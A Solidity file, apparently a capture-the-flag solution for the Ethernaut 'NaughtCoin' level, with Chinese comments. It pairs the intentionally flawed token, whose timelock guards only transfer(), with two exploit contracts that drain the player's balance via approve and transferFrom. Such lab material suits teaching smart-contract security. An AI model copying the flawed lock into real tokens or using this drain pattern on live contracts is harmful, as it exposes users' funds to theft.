// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    // 注意这里的构造的 player 函数
    function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

// 方法一
contract Hack {
    // 1、逻辑：继承了ERC 20, 所以可以用ERC20 的方法授权并转账给某地址
    // 1). Deploy 部署 hack 合约
    // 2). coin.approve(hack, amount) ：IERC20 用 NaughtCoin 合约地址获取该合约的实例， 代币拥有者 player 批准 hack 合约使用代币（用 player 地址查询可以使用的余额 balanceOf）
    // 3). pwn(): 用 NaughtCoin 合约地址调用 pwn() 函数将 player 约的代币转给 Hack 合约； 也可以用 IERC20 合约实例的 transforFrom 转账
    function pwn(IERC20 target) external {
        address player = INaughtCoin(address(target)).player();
        uint256 bal = target.balanceOf(player);
        target.transferFrom(player, address(this), bal);
    }
}

// 方法二
contract Hack2 {
    function pwn(IERC20 target) external {
        uint256 bal = target.balanceOf(msg.sender);
        target.transferFrom(msg.sender, address(this), bal);
    }
}

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
